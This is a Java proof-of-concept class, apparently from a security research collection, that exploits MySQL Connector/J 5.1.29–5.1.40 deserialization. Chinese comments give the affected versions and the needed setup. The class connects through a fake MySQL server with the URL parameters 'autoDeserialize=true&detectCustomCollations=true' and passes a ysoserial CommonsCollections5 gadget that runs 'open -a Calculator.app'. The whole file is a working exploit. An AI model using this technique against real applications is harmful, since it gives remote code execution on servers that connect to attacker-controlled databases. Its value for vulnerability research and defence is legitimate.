package org.su18.jdbc.attack.mysql.customcollations;

import org.su18.jdbc.attack.mysql.util.ConnectionUtil;

/**
 * 使用 https://github.com/fnmsd/MySQL_Fake_Server 进行测试
 * 依赖版本 5.1.29
 * 驱动名称 com.mysql.jdbc.Driver
 * 属性名 detectCustomCollations
 * 连接参数 autoDeserialize=true&detectCustomCollations=true
 * 备注 5.1.29-5.1.40 需指定 detectCustomCollations
 *
 * @author su18
 */
public class Attack512x {

	public static void main(String[] args) throws Exception {

		String driverName    = "com.mysql.jdbc.Driver";
		String connectionUrl = "jdbc:mysql://localhost:13308/whatever?autoDeserialize=true&detectCustomCollations=true";

		ConnectionUtil.getJDBCConnection(driverName, connectionUrl, "yso_CommonsCollections5_open -a Calculator.app", "");
	}

}
